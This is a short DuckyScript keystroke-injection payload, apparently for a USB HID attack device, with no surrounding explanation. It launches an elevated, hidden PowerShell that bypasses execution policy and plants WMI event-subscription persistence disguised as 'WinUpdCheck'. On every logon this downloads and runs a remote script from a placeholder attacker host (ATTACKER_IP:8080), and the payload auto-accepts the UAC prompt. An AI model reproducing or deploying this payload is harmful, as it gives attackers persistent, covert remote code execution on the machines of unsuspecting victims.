GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w hidden -ep bypass -c "$filt=[wmiclass]\"\\.\root\subscription:__EventFilter\";$fi=$filt.CreateInstance();$fi.Name=\"WinUpdCheck\";$fi.EventNameSpace=\"root\cimv2\";$fi.QueryLanguage=\"WQL\";$fi.Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_LogonSession''\";$fi.Put()|Out-Null;$cons=[wmiclass]\"\\.\root\subscription:CommandLineEventConsumer\";$co=$cons.CreateInstance();$co.Name=\"WinUpdCheck\";$co.CommandLineTemplate=\"powershell -w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP:8080/beacon.ps1'')\";$co.Put()|Out-Null;$bind=[wmiclass]\"\\.\root\subscription:__FilterToConsumerBinding\";$bi=$bind.CreateInstance();$bi.Filter=$fi.__PATH;$bi.Consumer=$co.__PATH;$bi.Put()|Out-Null"'
ENTER
DELAY 2000
ALT y
